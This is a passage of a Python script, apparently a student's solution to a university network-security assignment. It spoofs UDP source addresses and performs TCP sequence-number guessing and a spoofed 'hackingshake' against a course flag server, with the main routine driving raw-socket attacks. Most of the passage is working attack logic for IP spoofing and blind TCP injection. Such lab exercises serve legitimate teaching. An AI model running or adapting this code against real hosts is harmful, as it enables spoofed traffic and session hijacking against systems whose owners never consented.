    # Handle command-line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-I", "--int",  help='Interface to use (default is tap0)', nargs=1,
                                            default=["tap0"], required=False)
    parser.add_argument("-u", "--udp",  help='UDP spoofing (default, cannot be together with TCP)',
                                            action="store_true", required=False)
    parser.add_argument("-t", "--tcp",  help='TCP spoofing (cannot be together with UDP)',
                                            action="store_true", required=False)
    parser.add_argument("-g", "--guess",help='TCP guess mode (only TCP, used to guess sequence numbers, UDP server disabled)',
                                            action="store_true", required=False)
    parser.add_argument("-n", "--syn",  help='Sequence number to start (only TCP, default is 1)', type=int,
                                            nargs=1, required=False)
    parser.add_argument("-s", "--srv",  help='Server to attack (default to assignment server)',
                                            nargs=1, required=False)
    parser.add_argument("-p", "--port", help='Port to attack (default to assignment 13337)',
                                            type=int, nargs=1, required=False)
    #parser.add_argument("-o", "--outfile",  help='Output file', required=False)

    # Seeds random number generator - bad crypto! but at least it uses /dev/urandom :-)
    seed(os.urandom(2))

    # Parse Arguments
    try:
        args = parser.parse_args()

        linux_int = args.int[0]
        if args.tcp:
            PROTOCOL = socket.IPPROTO_TCP
        if args.syn:
            if args.tcp:
                SEQUENCE_START = args.syn [0]
            else:
                print("TCP Sequence Number only usable with TCP protocol!")
                raise argparse.ArgumentError

        # Addresses and data
        if PROTOCOL == socket.IPPROTO_UDP:
            FLAG_SERVER_ADDR = 'flagserv.cse543.rev.fish'           # provided by the assignment if UDP
        elif PROTOCOL == socket.IPPROTO_TCP:
            FLAG_SERVER_ADDR = 'flagit.cse543.rev.fish'             # provided by the assignment if TCP
        else:
            print("We only support TCP and UDP at the moment!")
            sys.exit(1)
        if args.srv:
            FLAG_SERVER_ADDR = args.srv[0]
        if args.port:
            FLAG_SERVER_PORT = args.port[0]

    except argparse.ArgumentError:
        print("Error in command line parameters. Exiting.")
        sys.exit(1)

    FLAG_SERVER_IP = socket.gethostbyname(FLAG_SERVER_ADDR)             # resolve IP from the name
    SOURCE_ADDR = get_ip_address_iface(socket.AF_INET, linux_int)       # we only do IPv4 right now
    if SOURCE_ADDR == "":
        print("The selected Linux interface is not up! Exiting.")
        sys.exit()
    #SOURCE_ADDR6 = get_ip_address_iface(socket.AF_INET6, linux_int)     # we only do IPv4 right now

    # The message to be sent is our actual IP address
    #   on the interface bound on the OpenVPN connection
    #   unless overridden
    MESSAGE = SOURCE_ADDR

    if PROTOCOL == socket.IPPROTO_TCP:
        print ("Target Server Protocol: %s = TCP" % PROTOCOL)
    elif PROTOCOL == socket.IPPROTO_UDP:
        print ("Target Server Protocol: %s = UDP" % PROTOCOL)
    else:
        print ("Target Server Protocol requested: %s - NOT SUPPORTED" % PROTOCOL)
        sys.exit()
    print ("Target ADDR: %s" % FLAG_SERVER_ADDR)
    print ("Target IP: %s" % FLAG_SERVER_IP)
    print ("Target port: %d" % FLAG_SERVER_PORT)
    if not args.guess:
        print ("Source IP (Spoofed): %s" % SPOOFED_SRC)
    else:
        print ("Starting in GUESS MODE")
    print ("Source IP (Real): %s" % SOURCE_ADDR)
    print ("Source port: %d" % SOURCE_PORT)
    print ("Using Interface: %s" % linux_int)
    if PROTOCOL == socket.IPPROTO_TCP:
        print ("Starting TCP Sequence number: %d" % SEQUENCE_START)
    print ("Message being sent: %s" % MESSAGE)

    # Creates a threads for receiving and printing UDP packets.
    # This is used to get the flag for the assignment, and works for both UDP and TCP
    # exercises.
    if not args.guess:
        try:
            sock_rcv1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock_rcv1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock_rcv1.bind((SOURCE_ADDR, CLIENT_RECEIVING_PORT))

            sock_rcv2 = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock_rcv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock_rcv2.bind((SOURCE_ADDR, CLIENT_RECEIVING_PORT))

            print ("Multithreaded Python Server waiting for UDP packets...")

            d = threading.Thread(name='udp_thread_handler', target=udp_thread_handler,
                args=(SOURCE_ADDR, CLIENT_RECEIVING_PORT, sock_rcv1, sock_rcv2))
            d.setDaemon(True)
            d.start()

            print("Server started at {} port {}".format(SOURCE_ADDR, CLIENT_RECEIVING_PORT))
        except:
            print ("Error: unable to start thread")

        time.sleep(2)       # Waits to be sure the UDP listener is ready

    if PROTOCOL == socket.IPPROTO_UDP:
        # Creates a raw UDP datagram sockets for sending the message.
        # If it is failing, most likely it is because the program is not ran as root user/setuid
        try:
            sock_snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            print ("Sending socket created")

        except IOError as error:
            if error.errno != errno.EINTR:
                print ("Socket creation failed (did you run it as root?). Error Code : " +
                    str(error.errno))
                sys.exit()

        # Assembles the UDP packet
        raw_packet = make_udp_packet(
            (SPOOFED_SRC, SOURCE_PORT),         # IP source, IP source port
            (FLAG_SERVER_IP, FLAG_SERVER_PORT), # IP destination, IP destination port
            MESSAGE)                            # IP message

        # Send a raw socket
        if send_udp_packet (sock_snd, (FLAG_SERVER_IP, FLAG_SERVER_PORT), raw_packet):
            print ("Sending message successful!")

    elif PROTOCOL == socket.IPPROTO_TCP:
        # Creates raw TCP datagram sockets for sending and receiving messages
        # and three-way handshake.
        # If it is failing, most likely it is because the program is not ran as root user/setuid.

        sock_snd, sock_rcv = open_tcp_sockets ()

        # perform a full TCP/IP handshake with the real IP
        new_ack,new_seq = perform_tcp_handshake(
            sock_snd, sock_rcv,
            (SOURCE_ADDR, SOURCE_PORT),         # IP source, IP source port
            (FLAG_SERVER_IP, FLAG_SERVER_PORT), # IP destination, IP destination port
            SEQUENCE_START)		                # sequence number for handshake
        print ("TCP/IP Handshake with %s port %d successful!" %
            (FLAG_SERVER_IP, FLAG_SERVER_PORT))

        if args.guess:
            # We are in TCP sequence number guessing mode.
            # This is used to collect and observe pattern from SEQs.
            # Loops to collect as many as possible to find the pattern
            try:
                print ("Trying to observe the sequence...\n")
                count = 0
                while (count < 50):
                    # perform a full TCP/IP handshake with the real IP
                    new_ack,new_seq = perform_tcp_handshake(
                        sock_snd, sock_rcv,
                        (SOURCE_ADDR,                           # IP source
                        socket.htons(randint(20000, 50000))),   # IP source port
                        (FLAG_SERVER_IP, FLAG_SERVER_PORT),     # IP destination, IP destination port
                        SEQUENCE_START,		                    # sequence number for handshake
                        MESSAGE)                                # Address to respond to
                    time.sleep(.5)
                    count += 1
                print ("\nSending sequence completed. Can you guess the pattern?")
            except IOError as error:
                if error.errno != errno.EINTR:
                    print ("Sending TCP/IP messages with destination %s and port %d failed." % (FLAG_SERVER_IP, FLAG_SERVER_PORT))
                    print ("Error Code : " + str(error.errno))
                    sys.exit()
        else:
            # We are in exploiting mode. Call the hacking function.
            new_ack,new_seq = perform_tcp_hackingshake(
                sock_snd,
                sock_rcv,
                (SOURCE_ADDR,                           # IP source
                socket.htons(randint(20000, 50000))),
                SPOOFED_SRC,                        # IP source to spoof
                (FLAG_SERVER_IP, FLAG_SERVER_PORT), # IP destination, IP destination port
                new_ack,                            # acknow.edge becomes sequence
                new_seq,                            # sequence number from the previous handshake (for guessing)
                MESSAGE)                            # IP to send the UDP reply to
            print ("Hacking sequence completed. Did it work?")

    else:
        print ("Only UDP and TCP are supported!")
        sys.exit()

    GLOBAL_EXIT = True
    time.sleep(2)

    try:
        # Close all other sockets
        sock_rcv1.close()
        sock_rcv2.close()
        sock_snd.close()
        sock_rcv.shutdown(socket.SHUT_WR)
        buf = 1
        while buf:
            buf = sock_rcv.recv(1)
        sock_rcv.close()
    except:
        pass
